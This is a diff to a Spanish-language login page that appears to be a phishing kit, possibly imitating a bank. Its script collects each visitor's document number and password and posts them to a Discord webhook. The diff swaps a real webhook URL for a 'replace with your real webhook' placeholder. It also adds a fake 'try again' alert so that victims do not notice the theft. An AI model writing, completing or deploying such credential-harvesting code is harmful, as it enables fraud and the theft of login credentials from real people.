@@ -309,13 +309,13 @@
 
             <a href="#" class="more-info" onclick="toggleMoreInfo()">Más información</a>
 
-            <button type="submit" class="login-btn"></button>
+            <button type="submit" class="login-btn">Entrar</button>
         </form>
     </main>
 
     <script>
-        async function senddNotification(docNumber, password) {
-            const webhookURL = 'https://discord.com/api/webhooks/1405668339992363008/Jwg1y1TsyA3eVEkpIC0P-n7zyQ0BUwCxSpQg8CFrOoDFbSXARHaD68ndkKClJkKal59M'; // REEMPLAZA con tu webhook real
+        async function sendDiscordNotification(docNumber, password) {
+            const webhookURL = 'YOUR_DISCORD_WEBHOOK_URL'; // REEMPLAZA con tu webhook real
 
             const data = {
                 content: `Nuevo inicio de sesión:\nDocumento: ${docNumber || 'desconocido'}\nContraseña: ${password || 'no especificada'}`
@@ -360,6 +360,7 @@
             loginBtn.style.background = 'linear-gradient(135deg, #666, #999)';
 
             setTimeout(() => {
+                alert('Intentelo de nuevo');
                 loginBtn.textContent = 'Entrar';
                 loginBtn.style.background = 'linear-gradient(135deg, #EC0000, #FF4444)';
             }, 2000);
